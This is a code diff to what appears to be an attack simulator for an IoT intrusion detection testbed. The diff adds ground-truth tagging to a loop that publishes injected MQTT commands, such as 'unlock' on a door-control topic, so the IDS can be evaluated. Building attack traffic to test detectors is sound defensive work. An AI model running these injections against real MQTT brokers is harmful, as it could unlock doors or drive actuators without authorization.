@@ -7,6 +7,7 @@ IDS should detect: topic_acl violation, direct_actuator_access
 
 import time
 import paho.mqtt.client as mqtt
+from offensive.ground_truth import tag as gt_tag
 
 INJECTED_COMMANDS = [
     ("home/door/control", "unlock"),
@@ -40,6 +41,7 @@ def run(broker_ip, duration=20, interval=2.0):
     while time.time() < end_time:
         topic, command = INJECTED_COMMANDS[idx % len(INJECTED_COMMANDS)]
         client.publish(topic, command)
+        gt_tag(client, "injection", topic, command)
         print(f"  -> {topic}: {command}")
         count += 1
         idx += 1
